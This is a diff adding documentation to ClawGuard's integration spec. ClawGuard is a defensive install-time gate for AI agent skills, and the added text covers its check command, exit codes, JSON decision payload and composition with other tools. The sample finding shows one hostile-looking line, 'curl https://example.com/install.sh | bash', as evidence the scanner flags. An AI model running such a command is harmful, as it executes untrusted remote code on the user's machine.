@@ -11,6 +11,221 @@ This spec defines how ClawGuard should work with OpenClaw, ClawHub, GitHub, web 
 - Verify declarations against local file behavior.
 - Make output easy to paste into issues, PRs, and docs.
 
+## Available Contracts
+
+- `clawguard.check.v1` — compact decision payload from `clawguard check`. Schema: [clawguard-check.schema.json](../schemas/clawguard-check.schema.json). Covered below in "ClawGuard Check Contract".
+- `clawguard.install.v1` — install wrapper payload from `clawguard install <url>` and `clawguard install --resume`. Schema: [clawguard-install.schema.json](../schemas/clawguard-install.schema.json). Spec: [INSTALL_WRAPPER_SPEC.md](INSTALL_WRAPPER_SPEC.md).
+- `clawguard-report` (`1.0.0`) — full scan report from `clawguard scan --json`. Schema: [clawguard-report.schema.json](../schemas/clawguard-report.schema.json). Reference: [REPORT_SCHEMA.md](REPORT_SCHEMA.md).
+
+## ClawGuard Check Contract
+
+`clawguard check` is the single integration entry point for any other tool that wants ClawGuard to make a decision about a candidate skill, MCP config, dependency manifest, or proposed agent action.
+
+It is intentionally smaller than [`clawguard scan`](REPORT_SCHEMA.md). Scan returns the full report; check returns a compact decision designed for third-party callers (OpenClaw, Hermes, ClawHub, MCP servers, CI pipelines) that only need to know **allow / manual_review / block** and a short reason.
+
+### Status
+
+The output schema is frozen as `clawguard.check.v1`. See [schemas/clawguard-check.schema.json](../schemas/clawguard-check.schema.json).
+
+The CLI command is **implemented** as of 2026-05-25. Projection logic lives in [src/check.js](../src/check.js); CLI wiring is in [src/cli.js](../src/cli.js). Unit tests are in [test/check.test.js](../test/check.test.js); end-to-end CLI tests are in [test/check-cli.test.js](../test/check-cli.test.js). Callers can also still use `clawguard gate <target> --json` (exit code 0/1/2) or project `clawguard scan <target> --json` through the mapping below if they want the underlying enum.
+
+### Command shape
+
+```bash
+clawguard check <target> [--policy personal|governed|enterprise] [--config ./.clawguard.json] [--json] [--write-report ./scan.json]
+```
+
+- `<target>` — local path, ClawHub URL, or other identifier the underlying scanner accepts.
+- `--policy` — overrides the policy preset for this check.
+- `--config` — path to a `.clawguard.json`.
+- `--json` — emit the decision payload to stdout. Without `--json`, emit a one-line human summary and use exit codes for the decision (see below).
+- `--write-report <path>` — also write the full scan report to that path and reference it in `scanReportPath`.
+
+### Exit codes
+
+- `0` — `decision: "allow"`
+- `1` — `decision: "manual_review"`
+- `2` — `decision: "block"`
+- non-zero, non-{0,1,2} — operational error (bad target, invalid config, unreadable file, etc.). Callers MUST treat any unexpected non-zero exit code as a hard failure, not as a decision.
+
+### Output payload
+
+Shape is defined by [schemas/clawguard-check.schema.json](../schemas/clawguard-check.schema.json). Example:
+
+```json
+{
+  "schemaVersion": "clawguard.check.v1",
+  "target": "/Users/me/skills/some-candidate",
+  "decision": "manual_review",
+  "risk": "high",
+  "summary": "Skill declares no install steps but runs a remote installer script.",
+  "recommendedAction": "require_user_approval",
+  "policyPreset": "governed",
+  "findingSummary": { "critical": 0, "high": 1, "medium": 2, "low": 0 },
+  "findings": [
+    {
+      "ruleId": "remote-code-execution",
+      "title": "Downloads or executes remote code",
+      "severity": "high",
+      "file": "SKILL.md",
+      "line": 12,
+      "evidence": "curl https://example.com/install.sh | bash"
+    }
+  ],
+  "requiredActions": ["sandbox before trusting", "verify install source"],
+  "scanReportPath": null,
+  "configPath": "/Users/me/skills/some-candidate/.clawguard.json",
+  "generatedAt": "2026-05-25T05:30:00.000Z"
+}
+```
+
+### Field semantics
+
+- `decision` — three-way, **the only field a minimal caller needs**. `allow` means safe to proceed; `manual_review` means pause and ask the user; `block` means do not proceed.
+- `risk` — display-only label. Same enum as the scan report `level`.
+- `summary` — one line, max 280 chars, no newlines. Safe to embed in approval messages, PR comments, chat notifications.
+- `recommendedAction` — concrete next step for an install/gate workflow. Stable mapping (see below). Callers MAY ignore this and use `decision` alone.
+- `findings` — top findings that drove the decision. Order: severity (critical → low), then file path. Length is **not** guaranteed to equal total findings; use `findingSummary` for counts and `scanReportPath` (when set) for the full list.
+- `requiredActions` — human-readable list copied from the underlying policy decision (e.g. "sandbox required", "dual approval needed"). May be empty.
+- `generatedAt` — ISO-8601, UTC.
+
+### Decision and action mapping
+
+`clawguard check` projects the richer scan `policy.decision` into the three-way contract. Callers needing the full enum (`warn`, `sandbox_required`, `dual_approval`) should use `clawguard scan --json` instead.
+
+| scan `policy.decision` | check `decision` | check `recommendedAction` | exit code |
+|---|---|---|---|
+| `allow` | `allow` | `auto_install` | 0 |
+| `warn` | `manual_review` | `require_user_approval` | 1 |
+| `manual_review` | `manual_review` | `require_user_approval` | 1 |
+| `sandbox_required` | `manual_review` | `require_user_approval` | 1 |
+| `dual_approval` | `manual_review` | `require_user_approval` | 1 |
+| `block` | `block` | `reject` | 2 |
+
+Callers that need to distinguish `sandbox_required` from `manual_review` should read `requiredActions` (it will contain the literal phrase from the underlying policy) or use the full scan report.
+
+### How third-party tools should call it
+
+```mermaid
+flowchart LR
+  agent[Other agent / CI / OpenClaw] -->|"clawguard check <target> --json"| cg[ClawGuard]
+  cg -->|"v1 decision JSON"| agent
+  agent --> route{decision}
+  route -->|allow| install[install / trust]
+  route -->|manual_review| ask[prompt user]
+  route -->|block| reject[refuse]
+```
+
+Minimum-viable consumer logic (any language):
+
+```text
+result := exec("clawguard", "check", target, "--json")
+if result.exitCode == 2 then reject
+if result.exitCode == 1 then ask_user(result.summary)
+if result.exitCode == 0 then proceed
+otherwise treat as hard failure
+```
+
+A caller that does not want to parse JSON can rely on exit codes plus the human one-liner printed when `--json` is omitted.
+
+### Versioning policy
+
+Within `clawguard.check.v1`:
+
+- Existing required fields will not be removed.
+- Existing enum values will not be renamed.
+- New optional fields may be added.
+- New finding shapes will keep the documented required fields.
+- Breaking changes increment `schemaVersion` to `clawguard.check.v2`. The CLI will continue to support `--schema-version=v1` for at least one minor release after v2 ships.
+
+This is the same compatibility policy used by [clawguard-report.schema.json](../schemas/clawguard-report.schema.json); see [REPORT_SCHEMA.md](REPORT_SCHEMA.md).
+
+### Relationship to existing commands
+
+- `clawguard scan` — full report, all findings, all auxiliary blocks (workspace, clawhub, dependencies). Best for human review and CI artifacts.
+- `clawguard gate` — same decision logic as `check`, but uses exit codes only and a human-readable summary. Equivalent to `clawguard check` without `--json`.
+- `clawguard install` — wraps `check` and only copies on `allow`.
+- `clawguard run-plan` — combines `check` with model routing and budget into one combined plan. Returns a richer object that includes the check decision plus model and budget context.
+
+`check` exists so third-party agents do not need to learn the full report schema or the install wrapper.
+
+### Implementation notes
+
+`clawguard check` reuses the existing `scanTarget` path, then projects the result through [src/check.js](../src/check.js):
+
+1. Reads `policy.decision` and maps through the table above.
+2. Reads `level` into `risk`.
+3. Sorts findings by severity then file path and caps the embedded list at 10.
+4. Copies `summary` into `findingSummary`.
+5. Computes `recommendedAction` from the mapping.
+6. Clamps `summary` to 280 characters.
+
+Callers that need every field — including suppressed findings, workspace skills, ClawHub metadata, and dependency manifests — should keep using `clawguard scan --json`; `check` is the decision projection, not a replacement.
+
+## Compose Patterns
+
+ClawGuard occupies one slice of the OpenClaw ecosystem — the install-time gate. Several other projects own adjacent slices. The composition shapes below document how to run them together without coordination. None of these compose patterns requires upstream changes in any project.
+
+For the namespace context behind these composites, see [COMPARISON.md](COMPARISON.md) and [STRATEGIC_REVIEW.md](STRATEGIC_REVIEW.md). For ClawGuard's future OpenClaw plugin id constraint, see [PLUGIN_ID.md](PLUGIN_ID.md).
+
+### ClawGuard + superglue-ai/clawguardian
+
+`superglue-ai/clawguardian` is an OpenClaw plugin that fires on `before_agent_start`, `before_tool_call`, and `tool_result_persist`. It is **runtime** enforcement. ClawGuard's `install` command is **install-time** enforcement. They are series-composable on the same machine.
+
+```mermaid
+flowchart LR
+  user[user] -->|"clawguard install &lt;url&gt;"| cg[ClawGuard install gate]
+  cg -->|allow + copy| trusted[trusted skill folder]
+  trusted --> oc[OpenClaw loads skill]
+  oc --> hook[clawguardian before_tool_call hook]
+  hook -->|allow| toolCall[tool call executes]
+  hook -->|block/redact| safeReturn[redacted result]
+```
+
+- ClawGuard fails closed *before* the skill ever runs.
+- clawguardian fails closed *every time* the loaded skill tries to use a tool.
+- Neither needs to know about the other; they share only the trusted skill folder.
+
+### ClawGuard + lombax85/clawguard
+
+`lombax85/clawguard` is an outbound API gateway with CIBA-pattern Telegram approval. It keeps real API tokens off the agent's machine and forces a human tap on outbound calls. ClawGuard does not touch that path; it gates which skill code is ever loaded.
+
+```mermaid
+flowchart LR
+  user[user] -->|"clawguard install &lt;url&gt;"| cg[ClawGuard install gate]
+  cg -->|allow + copy| trusted[trusted skill folder]
+  trusted --> agent[OpenClaw / Hermes agent]
+  agent -->|outbound API call| gateway[lombax85 outbound gateway]
+  gateway -->|policy + Telegram approval| upstream[real GitHub / Slack / etc]
+  upstream --> gateway --> agent
+```
+
+- ClawGuard's `--approval-out <path>` records install approvals as JSONL.
+- lombax85's gateway records outbound-call approvals via Telegram.
+- Both can write to the same operator's audit channel without coupling.
+
+### ClawGuard + yourclaw/clawguard-web
+
+`yourclaw/clawguard-web` (`clawguard.sh`) is a hosted trust registry with on-demand scanning. ClawGuard's `clawguard.check.v1` payload is the candidate interop seam: a hosted registry can accept a check payload as input or emit one as output, without having to mirror the full scan report.
+
+```mermaid
+flowchart LR
+  candidate[candidate skill] -->|"clawguard check --json"| cg[clawguard.check.v1]
+  cg -->|POST decision| registry[clawguard-web registry]
+  registry -->|browse / decision| operator[operator]
+  registry -->|cached decision| ci[CI gate]
+```
+
+- ClawGuard does not depend on the registry being online.
+- The registry does not need to embed ClawGuard's scanner; it consumes the contract.
+- A future shared rule-id namespace would let the registry merge findings from multiple scanners; until then the contract is enough.
+
+### Why this composition is honest
+
+- None of these patterns implies ClawGuard is "the" install gate for OpenClaw — only that no other project ships one today.
+- Each project keeps its own identity, name, and threat model.
+- The same composition stories appear in [OUTREACH.md](OUTREACH.md) so the framing in any future outreach matches the framing here.
+
 ## OpenClaw Integration
 
 ### Starter Config
@@ -36,6 +251,8 @@ clawguard openclaw install ./candidate-skill \
   --to ./.agents/skills \
   --approval-out ./.clawguard/approvals.jsonl
 ```
+
+When the candidate is already downloaded to a local path, the command above is sufficient. To fetch a candidate directly from a URL (HTTPS tarball/zip, GitHub codeload archive, or `clawhub:` reference) into a quarantine folder before scanning and approval, see the spec for the URL-aware extension: [INSTALL_WRAPPER_SPEC.md](INSTALL_WRAPPER_SPEC.md). The URL flow reuses the same approval and trusted-folder semantics described in this section.
 
 This does not block OpenClaw or ClawHub discovery. Search and candidate selection can stay native. ClawGuard sits between the downloaded candidate and the trusted skill folder:
 
